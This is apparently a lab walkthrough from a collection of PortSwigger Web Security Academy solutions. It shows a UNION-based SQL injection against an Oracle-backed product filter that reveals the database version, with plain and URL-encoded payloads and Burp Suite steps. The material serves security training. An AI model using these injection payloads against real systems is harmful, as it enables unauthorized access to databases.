# Lab 7: SQL injection attack, querying the database type and version on Oracle

This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

## Hint 
On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual.

## Solution
> Manual Exploitation
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: ```'+UNION+SELECT+'abc','def'+FROM+dual--```
3. Use the following payload to display the database version: ```'+UNION+SELECT+BANNER,+NULL+FROM+v$version--```

> Scripting the Attack: [Script](https://github.com/darshannn10/PortSwiggers-Web-Sec-Academy/blob/main/SQL-Injection/lab-07/sqli-lab-07.py)

## Payload:
Normal: ```' UNION SELECT BANNER,NULL FROM v$version--```

URL-Encoded: ```%27%20UNION%20SELECT%20BANNER,NULL%20FROM%20v$version--```

## Video Solution:
1. Manually: [Rana Khalil's Youtube video](https://youtu.be/s0dFU2dKAKU)
2. Automating: [Rana Khalil's Youtube video](https://www.youtube.com/watch?v=neeY0iVa_0A&list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf&index=8)
